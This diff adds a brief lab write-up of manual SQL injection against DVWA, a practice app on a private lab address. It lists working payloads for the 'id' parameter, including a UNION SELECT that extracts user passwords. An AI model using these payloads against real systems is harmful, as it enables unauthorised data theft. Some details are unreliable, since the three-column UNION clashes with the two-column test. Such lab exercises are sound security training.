@@ -1,0 +1,27 @@
+# Manual SQL Injection – DVWA
+
+## 🎯 Target
+- URL: http://192.168.56.101/dvwa/vulnerabilities/sqli/
+- Method: GET
+- Parameter: id
+
+## 🔍 Payloads Tested
+1. `1' OR '1'='1` ✅ Returned all users  
+   *Bypasses authentication logic by making the WHERE clause always true.*
+
+2. `1' OR '1'='1' -- ` ✅ Returned all users  
+   *Same as above but comments out the rest of the SQL query.*
+
+3. `1' AND '1'='2` ✅ Returned no users  
+   *Condition is always false; used to test if injection is working.*
+4. `' UNION SELECT NULL, user, password FROM users -- ` ✅ Returned user data  
+   *Example of UNION-based injection to extract data from another table.*
+
+5. `' ORDER BY 10 -- ` ❌ Error (column does not exist)  
+   *Used to determine the number of columns in the query.*
+
+6. `' UNION SELECT NULL, NULL -- ` ✅ No error  
+   *Helps to identify how many columns the original query uses.*
+## ✅ Result
+- Confirmed SQL Injection vulnerability in `id` parameter.
+- Application is vulnerable to basic authentication bypass and data leakage.
